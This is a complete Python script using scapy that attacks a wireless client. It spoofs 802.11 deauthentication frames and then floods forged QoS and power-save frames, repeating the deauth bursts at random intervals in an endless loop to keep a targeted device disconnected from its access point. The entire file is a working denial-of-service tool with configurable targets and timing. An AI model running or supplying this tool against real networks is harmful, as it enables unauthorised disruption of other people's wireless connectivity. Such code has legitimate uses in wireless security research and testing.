import argparse
from scapy.all import *
import time
import random
import sys

# Argument Parser
parser = argparse.ArgumentParser(
    description=(
        "QoS + Doze Suppression Script\n"
        "Example:\n"
        "  sudo python3 qos_doze.py -t <Client_MAC> -a <AP_MAC> -i wlan1mon --deauth-interval 60\n"
    ),
    formatter_class=argparse.RawTextHelpFormatter,
)

parser.add_argument("-t", "--target", help="Target Client MAC (e.g., 90:48:6C:61:53:D1)", required=True)
parser.add_argument("-a", "--ap", help="AP MAC Address (e.g., 98:F7:81:54:F7:65)", required=True)
parser.add_argument("-i", "--interface", help="Monitor Mode Interface (e.g., wlan1mon)", required=True)

parser.add_argument("--deauth-interval", type=int, default=60, help="Time between deauth bursts (default: 60s)")
parser.add_argument("--qos-count", type=int, default=15, help="Number of QoS packets per cycle (default: 15)")
parser.add_argument("--qos-delay", type=float, default=0.005, help="Delay between QoS packets (default: 0.005s)")

# Handle Missing Arguments
try:
    args = parser.parse_args()
except SystemExit:
    print("\n[*] ERROR: Missing required arguments.\nUse -h for help.\n")
    sys.exit(1)

# Config from Args
ap_mac = args.ap
client_mac = args.target
iface = args.interface
deauth_interval = args.deauth_interval
qos_count = args.qos_count
qos_delay = args.qos_delay

# Packet Definitions
deauth_frame = RadioTap()/Dot11(type=0, subtype=12, addr1=client_mac, addr2=ap_mac, addr3=ap_mac)/Dot11Deauth(reason=5)
qos_null = RadioTap()/Dot11(type=2, subtype=12, addr1=ap_mac, addr2=client_mac, addr3=ap_mac)/Dot11QoS()/LLC()/SNAP()
qos_data = RadioTap()/Dot11(type=2, subtype=8, addr1=ap_mac, addr2=client_mac, addr3=ap_mac)/Dot11QoS(TID=3)/LLC()/SNAP()
snooze_frame = RadioTap()/Dot11(type=2, FCfield=0x10, addr1=ap_mac, addr2=client_mac, addr3=ap_mac)/LLC()/SNAP()

print("[*] Sending initial deauthentication...")
sendp(deauth_frame, iface=iface, count=8, inter=0.05, verbose=False)

print("[*] Running adaptive QoS + Doze attack...")

deauth_timer = time.time()

while True:
    sendp([qos_null, qos_data, snooze_frame], iface=iface, count=qos_count, inter=qos_delay, verbose=False)

    if time.time() - deauth_timer >= random.uniform(deauth_interval, deauth_interval * 2):  
        print("[*] Disrupting recovery with deauth...")
        sendp(deauth_frame, iface=iface, count=2, inter=0.05, verbose=False)  
        deauth_timer = time.time()

